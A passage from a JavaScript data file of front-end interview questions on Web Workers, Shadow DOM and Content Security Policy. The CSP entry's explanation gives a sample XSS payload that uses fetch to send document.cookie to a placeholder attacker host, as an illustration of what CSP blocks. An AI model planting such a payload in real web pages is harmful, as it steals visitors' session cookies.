        { line: 2, explanation: 'Creates a new OS thread running the specified worker script' },
        { line: 5, explanation: 'postMessage sends a copy of data to the worker thread' },
        { line: 8, explanation: 'onmessage fires asynchronously when worker calls self.postMessage()' },
        { line: 16, explanation: 'Worker receives data in its own isolated thread — UI stays smooth' }
      ]
    },
    keyPoints: [
      'Shared Workers allow multiple tabs/windows to share a single worker instance.',
      'Service Workers are a special type of worker that intercept network requests and enable offline functionality.',
      'Transferable objects (ArrayBuffer, MessagePort) are moved (not copied) to the worker, enabling zero-copy for large binary data.'
    ],
    interviewTip: 'Connect Web Workers to real use cases: Figma uses them for rendering, Google Docs uses them for spell-checking, and crypto wallets use them for key generation — all to keep the UI responsive during heavy compute.',
    tags: ['Web Workers', 'Parallelism', 'Performance', 'Threading', 'postMessage']
  },
  {
    id: 'html-14',
    stack: 'html',
    topic: 'Web APIs & Performance',
    title: 'What is the Shadow DOM and how does it enable true CSS encapsulation in Web Components?',
    difficulty: 'Advanced',
    summary: 'Shadow DOM is a browser feature that attaches an isolated, hidden DOM subtree to an element. Styles defined inside Shadow DOM do not leak out, and external styles do not bleed in — creating true encapsulation.',
    explanation: [
      'The Problem with Global CSS: In a regular DOM, CSS selectors are global. A .button { color: red } rule affects every element with class="button" on the page, causing style conflicts between components.',
      'Shadow Root: element.attachShadow({ mode: "open" }) creates a shadow root — a scoped DOM tree attached to the host element. All markup and styles within it are invisible to external document.querySelector() calls.',
      'CSS Encapsulation: Styles inside <style> tags in a shadow root apply only to shadow DOM elements. External stylesheets cannot reach in. This is how browser native elements (<video>, <input>, <select>) hide their internal implementation.'
    ],
    codeExample: {
      language: 'javascript',
      filename: 'web-component.js',
      code: `class StyledCard extends HTMLElement {
  constructor() {
    super();
    // Create shadow root — isolates DOM and CSS
    const shadow = this.attachShadow({ mode: 'open' });

    shadow.innerHTML = \`
      <style>
        /* These styles are SCOPED — they won't affect the outside page */
        :host {
          display: block;
          border-radius: 12px;
          overflow: hidden;
        }
        .card {
          padding: 20px;
          background: #1e293b;
          color: #f1f5f9;
          font-family: Inter, sans-serif;
        }
        h2 { color: #38bdf8; margin: 0 0 8px; }
      </style>
      <div class="card">
        <h2><slot name="title">Default Title</slot></h2>
        <p><slot>Default content</slot></p>
      </div>
    \`;
  }
}

customElements.define('styled-card', StyledCard);`,
      output: '<styled-card> renders with isolated CSS — external .card or h2 rules cannot affect it.',
      executionSteps: [
        { line: 5, explanation: 'mode:"open" means external JS can access shadow root via element.shadowRoot' },
        { line: 10, explanation: ':host selector styles the custom element itself from within shadow DOM' },
        { line: 22, explanation: '<slot> is a placeholder filled with light DOM children by the consumer' }
      ]
    },
    keyPoints: [
      ':host selects the shadow host element itself from inside the shadow root.',
      '<slot> elements define insertion points where consumers can inject their own content into the component.',
      'CSS Custom Properties (variables) do pierce the shadow boundary — a clean API for theming components.'
    ],
    interviewTip: 'Shadow DOM is the foundation of Web Components (Custom Elements + Shadow DOM + HTML Templates). Mention that major UI frameworks simulate this with scoped CSS / CSS Modules since Shadow DOM has some interop quirks with server-side rendering.',
    tags: ['Shadow DOM', 'Web Components', 'CSS Encapsulation', 'Custom Elements', 'Slots']
  },
  {
    id: 'html-15',
    stack: 'html',
    topic: 'Web APIs & Performance',
    title: 'What is Content Security Policy (CSP) and how does it protect against XSS attacks?',
    difficulty: 'Advanced',
    summary: 'Content Security Policy is an HTTP response header (or <meta> tag) that whitelists trusted sources for scripts, styles, images, and fonts — preventing injected malicious scripts from executing even if XSS exists.',
    explanation: [
      'XSS Attack: An attacker injects malicious JavaScript (e.g., <script>fetch("attacker.com?c="+document.cookie)</script>) into the page via user input, comments, or compromised third-party scripts. Without CSP, the browser executes it.',
      'CSP Header: Content-Security-Policy: script-src "self" https://cdn.trusted.com; instructs the browser to only execute scripts from the page\'s own origin and the trusted CDN. Any other script source is blocked and logged.',
      'Nonce-Based CSP: For inline scripts, add a server-generated cryptographic nonce: script-src "nonce-{randomValue}". Only <script nonce="randomValue"> tags are allowed to execute — injected scripts have no nonce and are blocked.'
    ],
    codeExample: {
      language: 'html',
      filename: 'csp-example.html',
      code: `<!-- Method 1: HTTP Response Header (preferred — set on server) -->
<!--
HTTP/1.1 200 OK
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123xyz' https://trusted-cdn.com;
  style-src 'self' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  font-src https://fonts.gstatic.com;
  connect-src 'self' https://api.myapp.com;
  frame-ancestors 'none';
-->

<!-- Method 2: Meta tag (less powerful — cannot restrict frames) -->
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-abc123xyz'">

<!-- Only this inline script executes — it has the matching nonce -->
<script nonce="abc123xyz">
  console.log('Trusted inline script executes!');
</script>

<!-- Injected XSS attack — BLOCKED because no nonce -->
<script>document.cookie</script>`,
      output: `[Blocked] Refused to execute inline script because it violates the Content Security Policy directive: "script-src 'nonce-abc123xyz'"`,
      executionSteps: [
        { line: 4, explanation: 'default-src acts as fallback for all resource types not explicitly listed' },
        { line: 5, explanation: "nonce-abc123xyz allows only scripts with matching nonce attribute" },
        { line: 11, explanation: 'frame-ancestors: none prevents clickjacking via iframes' },
        { line: 19, explanation: 'Script with matching nonce is permitted to execute' }
      ]
    },
    keyPoints: [
      'report-uri / report-to directives send CSP violation reports to a logging endpoint without blocking.',
      'Content-Security-Policy-Report-Only lets you test CSP rules without enforcing them first.',
      'CSP v3 with strict-dynamic allows trusted scripts to dynamically load other scripts without whitelisting every URL.'
    ],
    interviewTip: 'CSP is a defense-in-depth measure — it does not replace input sanitization and output encoding, which remain the primary XSS defenses. CSP prevents execution of injected scripts even when sanitization fails.',
    tags: ['CSP', 'Security', 'XSS', 'Nonce', 'HTTP Headers']
  }
];
